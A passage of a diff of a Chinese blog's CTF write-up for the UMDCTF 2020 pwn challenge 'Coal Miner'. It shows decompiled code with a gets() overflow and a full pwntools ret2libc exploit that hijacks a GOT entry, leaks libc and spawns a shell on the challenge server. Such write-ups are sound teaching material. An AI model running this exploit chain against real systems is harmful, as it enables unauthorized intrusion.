 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>main 函数如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-220h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+210h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="number">0x208</span>uLL);</span><br><span class="line">  s = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nWelcome to the Item Database"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You may choose the commands 'add' or 'print' or 'done'"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">8u</span>LL);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, <span class="number">0L</span>L);</span><br><span class="line">        fgets((<span class="keyword">char</span> *)&amp;s, <span class="number">7</span>, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s, <span class="string">"add\n"</span>) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        AddItem(&amp;v4, <span class="string">"add\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s, <span class="string">"print\n"</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      PrintItems(&amp;v4, <span class="string">"print\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;s, <span class="string">"done\n"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Command not recognized"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>AddItem 函数如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">AddItem</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = *(_DWORD *)(a1 + <span class="number">512</span>);</span><br><span class="line">  *(_QWORD *)(<span class="number">16L</span>L * v2 + a1 + <span class="number">8</span>) = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter a name: "</span>);</span><br><span class="line">  gets(<span class="number">16L</span>L * *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(v1 + <span class="number">512</span>) + v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter a description: "</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  **(_QWORD **)(<span class="number">16L</span>L * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_DWORD *)(v1 + <span class="number">512</span>))++ + v1 + <span class="number">8</span>) = v4;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p><strong>PrintItems 函数如下：</strong></p>
+
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">PrintItems</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_DWORD *)(a1 + <span class="number">512</span>) &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Item %d\n"</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(a1 + <span class="number">512</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t%s\n"</span>, <span class="number">16L</span>L * (<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t%s\n"</span>, *(_QWORD *)(<span class="number">16L</span>L * (<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1 + <span class="number">8</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+
+
 <p>没啥好说的：ret2libc</p>
+
 <p>PrintItems 函数没啥用，就是远程的 libc 是 debian 的，很强</p>
+
 <p><strong>exp 如下：</strong></p>
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> easyLibc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(arch=<span class="string">"amd64"</span>, endian=<span class="string">'el'</span>, os=<span class="string">"linux"</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./coalminer'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'161.35.8.211'</span>, <span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./coalminer'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, desc)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'add'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'name: \n'</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">'description: \n'</span>, desc)</span><br><span class="line"></span><br><span class="line">got___stack_chk_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">rop1 = <span class="number">0x4009AE</span></span><br><span class="line">rop2 = <span class="number">0x0000000000400bec</span>  <span class="comment"># pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">rop3 = <span class="number">0x0000000000400bf3</span>  <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">"b *0x4009C6\nb *0x400a17\nc"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'add'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name: \n'</span>, <span class="string">'binLep'</span>)</span><br><span class="line"></span><br><span class="line">pd = p64(rop2)</span><br><span class="line">pd += p64(rop2)</span><br><span class="line">pd += <span class="string">'a'</span> * <span class="number">0x20</span></span><br><span class="line">pd += p64(rop2)</span><br><span class="line">pd += p64(got___stack_chk_fail)</span><br><span class="line">pd += <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">pd += p64(rop3)</span><br><span class="line">pd += p64(got_puts)</span><br><span class="line">pd += p64(plt_puts)</span><br><span class="line">pd += p64(rop1)</span><br><span class="line">p.sendlineafter(<span class="string">'description: \n'</span>, pd)</span><br><span class="line"></span><br><span class="line">addr_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = easyLibc(<span class="string">'puts'</span>, addr_puts, <span class="number">2</span>)</span><br><span class="line">libcbase = addr_puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">addr_system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">addr_bin_sh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x50</span></span><br><span class="line">pd += p64(rop3)</span><br><span class="line">pd += p64(addr_bin_sh)</span><br><span class="line">pd += p64(addr_system)</span><br><span class="line">p.sendlineafter(<span class="string">'description: \n'</span>, pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
 <hr>
+
 <h3 id="Flag-7"><a href="#Flag-7" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMDCTF-&#123;i_hop3_you_like_c0al_pres3nts&#125;</span><br></pre></td></tr></table></figure>
+
       
+
     </div>
+
     
+
   </div>
+
   
+
     
+
     <div class="copyright">
+
         <p><span>本文标题:</span><a href="">【WriteUp】UMDCTF  2020 -- Pwn 题解</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">binLep</a></p>
+
+        <p><span>文章作者:</span><a href="/old_blog_01/" title="回到主页">binLep</a></p>
+
         <p><span>发布时间:</span>2020-04-20, 23:23:00</p>
+
         <p><span>最后更新:</span>2020-04-23, 00:06:20</p>
+
         <p>
+
             <span>原始链接:</span><a class="post-url" href="" title="【WriteUp】UMDCTF  2020 -- Pwn 题解">https://binlep.github.io/old_blog_01/2020/04/21/【WriteUp】UMDCTF  2020 -- Pwn 题解/</a>
+
             <span class="copy-path" data-clipboard-text="原文: https://binlep.github.io/old_blog_01/2020/04/21/【WriteUp】UMDCTF  2020 -- Pwn 题解/　　作者: binLep" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+
             <script> var clipboard = new Clipboard('.copy-path'); </script>
+
         </p>
+
         <p>
+
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+
         </p>
+
     </div>
+
+
+
+
 
 
 
     <nav id="article-nav">
+
         
+
             <div id="article-nav-newer" class="article-nav-title">
+
                 <a href="../../23/【WriteUp】NPUCTF 2020 -- Pwn 题解/">
+
                     【WriteUp】NPUCTF 2020 -- Pwn 题解（未完）
+
                 </a>
+
             </div>
+
         
+
         
+
             <div id="article-nav-older" class="article-nav-title">
+
                 <a href="../../15/【Pwn 笔记】IO FILE 利用链汇总/">
+
                     【Pwn 笔记】IO FILE 利用链汇总（待补充）
+
                 </a>
+
             </div>
+
         
+
     </nav>
 
+
+
   
+
 </article>
 
+
+
     <div id="toc" class="toc-article">
+
         <strong class="toc-title">文章目录</strong>
+
         
+
             <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Easy-Right"><span class="toc-number">1.</span> <span class="toc-text">Easy Right?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">1.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">1.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Question"><span class="toc-number">2.</span> <span class="toc-text">Question</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-1"><span class="toc-number">2.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-1"><span class="toc-number">2.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cowspeak-as-a-Service-CaaS"><span class="toc-number">3.</span> <span class="toc-text">Cowspeak as a Service (CaaS)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-2"><span class="toc-number">3.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-number">3.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-2"><span class="toc-number">3.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcodia1"><span class="toc-number">4.</span> <span class="toc-text">shellcodia1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-3"><span class="toc-number">4.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-3"><span class="toc-number">4.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-3"><span class="toc-number">4.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-4"><span class="toc-number">5.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-4"><span class="toc-number">5.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-4"><span class="toc-number">5.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jump-Not-Found"><span class="toc-number">6.</span> <span class="toc-text">Jump Not Found</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-5"><span class="toc-number">6.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-5"><span class="toc-number">6.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-5"><span class="toc-number">6.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcodia2"><span class="toc-number">7.</span> <span class="toc-text">shellcodia2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-6"><span class="toc-number">7.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-6"><span class="toc-number">7.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-6"><span class="toc-number">7.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coal-Miner"><span class="toc-number">8.</span> <span class="toc-text">Coal Miner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description-7"><span class="toc-number">8.1.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-7"><span class="toc-number">8.2.</span> <span class="toc-text">Solution:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-7"><span class="toc-number">8.3.</span> <span class="toc-text">Flag:</span></a></li></ol></li></ol>
+
         
+
     </div>
+
     <style>
+
         .left-col .switch-btn,
+
         .left-col .switch-area {
+
             display: none;
+
         }
+
         .toc-level-3 i,
+
         .toc-level-3 ol {
+
             display: none !important;
+
         }
+
     </style>
+
+
 
     <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
+
+
     <script>
+
         yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+
     </script>
 
 
 
-    
-<div class="share">
-    
-        <div class="bdsharebuttonbox">
-            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
-            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
-            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
-            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
-            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
-            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
-            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
-        </div>
-        <script>
-            window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"【WriteUp】UMDCTF  2020 -- Pwn 题解　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
-        </script>
-    
+
+
+
 
     
+
+<div class="share">
+
+    
+
+        <div class="bdsharebuttonbox">
+
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+
+        </div>
+
+        <script>
+
+            window._bd_share_config={
+
+                "common":{"bdSnsKey":{},"bdText":"【WriteUp】UMDCTF  2020 -- Pwn 题解　| binLep's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+
+        </script>
+
+    
+
+
+
+    
+
 </div>
 
 
@@ -525,139 +1044,282 @@
 
 
 
+
+
+
+
+
+
+
+
     
+
+
+
+
+
 
 
 
 
     <div class="scroll" id="post-nav-button">
+
         
+
             <a href="../../23/【WriteUp】NPUCTF 2020 -- Pwn 题解/" title="上一篇: 【WriteUp】NPUCTF 2020 -- Pwn 题解（未完）">
+
                 <i class="fa fa-angle-left"></i>
+
             </a>
+
         
+
+
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
+
+
         
+
             <a href="../../15/【Pwn 笔记】IO FILE 利用链汇总/" title="下一篇: 【Pwn 笔记】IO FILE 利用链汇总（待补充）">
+
                 <i class="fa fa-angle-right"></i>
+
             </a>
+
         
+
     </div>
+
+
 
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../29/【置顶】博客搬家啦/">【置顶】博客搬家啦</a></li><li class="post-list-item"><a class="post-list-link" href="../../23/【WriteUp】NPUCTF 2020 -- Pwn 题解/">【WriteUp】NPUCTF 2020 -- Pwn 题解（未完）</a></li><li class="post-list-item"><a class="post-list-link" href="">【WriteUp】UMDCTF  2020 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../15/【Pwn 笔记】IO FILE 利用链汇总/">【Pwn 笔记】IO FILE 利用链汇总（待补充）</a></li><li class="post-list-item"><a class="post-list-link" href="../../15/【Pwn 笔记】glibc 利用中那些偏门的技巧/">【Pwn 笔记】Glibc 利用中那些偏门的技巧</a></li><li class="post-list-item"><a class="post-list-link" href="../../13/【WriteUp】Byte Bandits CTF 2020 -- Pwn 题解/">【WriteUp】Byte Bandits CTF 2020 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../12/【WriteUp】TG：HACK 2020 -- Pwn 题解/">【WriteUp】TG：HACK 2020 -- Pwn 题解（未完）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/30/【Blockchain 笔记】区块链的环境搭建/">【Blockchain 笔记】区块链的环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/26/【Pwn 笔记】Windows Pwn 环境搭建/">【Pwn 笔记】Windows Pwn 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/24/【Pwn 笔记】Linux 命令注入一览/">【Pwn 笔记】Linux 命令注入一览</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/24/【WrtieUp】BJDCTF 2nd -- Pwn 题解/">【WrtieUp】BJDCTF 2nd -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/21/【WrtieUp】CISCN 2019 -- Pwn 题解/">【WrtieUp】CISCN 2019 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/20/【Pwn 笔记】跨平台架构的环境配置与调试/">【Pwn 笔记】跨平台架构的环境配置与调试</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/12/【Pwn 笔记】Linux Kernel 调试命令总结/">【Pwn 笔记】Linux Kernel 调试命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/12/【Pwn 笔记】Linux Kernel 总结 -- ROP/">【Pwn 笔记】Linux Kernel 总结 -- Kernel-ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/12/【Pwn 笔记】Linux Kernel 调试文件总结/">【Pwn 笔记】Linux Kernel 调试文件总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/10/【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解/">【WriteUp】高校抗“疫”网络安全分享赛 -- Pwn 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../03/03/【Pwn 笔记】栈溢出利用总结 -- Advanced ROP/">【Pwn 笔记】栈溢出利用总结 -- Advanced ROP</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/29/【Crypto 笔记】古典密码学习/">【Crypto 笔记】古典密码学习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/28/【Web 笔记】md5 绕过总结/">【Web 笔记】Md5 绕过总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/28/【Web 笔记】关于 SSTI 注入/">【Web 笔记】关于 SSTI 注入及绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/25/【杂项】磁盘阵列知识梳理/">【杂项】磁盘阵列知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/25/【SQL 笔记】绕过技术总结/">【SQL 笔记】绕过技术总结</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/18/【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户/">【SQL 笔记】Oracle 12c 如何调用 SCOTT 用户</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/16/【WriteUp】HGAME 2020--Pwn题解/">【WriteUp】HGAME 2020--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/15/【WriteUp】ACTF 2020 题解/">【WriteUp】ACTF 2020 题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/02/【Misc 笔记】流量分析篇/">【Misc 笔记】流量分析篇</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/24/【Pwn 笔记】Android Kernel 环境搭建/">【Pwn 笔记】Android Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/13/【Pwn 笔记】Linux Kernel 环境搭建/">【Pwn 笔记】Linux Kernel 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/13/【WriteUp】SCTF 2019--Pwn题解/">【WriteUp】SCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/12/【WriteUp】RoarCTF 2019--Pwn题解/">【WriteUp】RoarCTF 2019--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/11/【Pwn 笔记】简单记如何利用 ret2_dl_resolve/">【Pwn 笔记】简单记如何利用 Ret2_dl_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/04/【WriteUp】安恒杯元旦月赛--Pwn题解/">【WriteUp】安恒杯元旦月赛--Pwn题解</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/03/【汇编学习】mips 寄存器/">【汇编学习】Mips 寄存器</a></li><li class="post-list-item"><a class="post-list-link" 